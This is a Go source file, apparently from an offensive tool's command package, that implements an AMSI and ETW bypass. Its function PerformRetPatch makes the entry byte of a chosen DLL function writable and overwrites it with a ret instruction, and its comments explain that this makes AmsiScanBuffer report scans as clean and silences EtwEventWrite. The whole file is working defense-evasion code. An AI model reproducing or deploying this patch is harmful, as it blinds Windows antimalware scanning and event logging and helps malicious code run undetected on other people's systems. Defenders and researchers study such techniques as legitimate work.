//go:build windows
// +build windows

package commands

import (
	"fmt"
	"syscall"
	"unsafe"
)

// PerformRetPatch applies a simple ret (0xC3) patch at the entry point of the
// specified function. This causes the function to immediately return when called,
// effectively neutralizing it.
//
// For AmsiScanBuffer: ret causes it to return with whatever is in RAX (typically 0/S_OK
// from the caller's prior state), and the AMSI_RESULT output parameter is left at its
// initialized value (AMSI_RESULT_CLEAN = 0).
//
// For EtwEventWrite: ret causes it to return 0 (STATUS_SUCCESS).
//
// This is the simplest and most reliable patching approach — no gadget search,
// no JMP calculation, no VEH handler. Just a single-byte memory write.
func PerformRetPatch(dllName, functionName string) (string, error) {
	// Load the target DLL
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return "", fmt.Errorf("failed to load %s: %v", dllName, err)
	}

	// Resolve the function address
	proc, err := dll.FindProc(functionName)
	if err != nil {
		return "", fmt.Errorf("failed to find %s in %s: %v", functionName, dllName, err)
	}

	funcAddr := proc.Addr()

	// Save original byte for reporting
	originalByte := *(*byte)(unsafe.Pointer(funcAddr))

	// Change memory protection to PAGE_EXECUTE_READWRITE so we can write
	procVirtualProtect := kernel32.NewProc("VirtualProtect")
	var oldProtect uint32
	ret, _, err := procVirtualProtect.Call(
		funcAddr,
		1, // just 1 byte
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return "", fmt.Errorf("VirtualProtect failed: %v", err)
	}

	// Write 0xC3 (ret) at the function entry point
	*(*byte)(unsafe.Pointer(funcAddr)) = 0xC3

	// Restore original memory protection
	var discardProtect uint32
	procVirtualProtect.Call(
		funcAddr,
		1,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&discardProtect)),
	)

	output := fmt.Sprintf("[+] Ret patch applied: %s!%s at 0x%X\n", dllName, functionName, funcAddr)
	output += fmt.Sprintf("[+] Overwrote 0x%02X with 0xC3 (ret)\n", originalByte)

	return output, nil
}
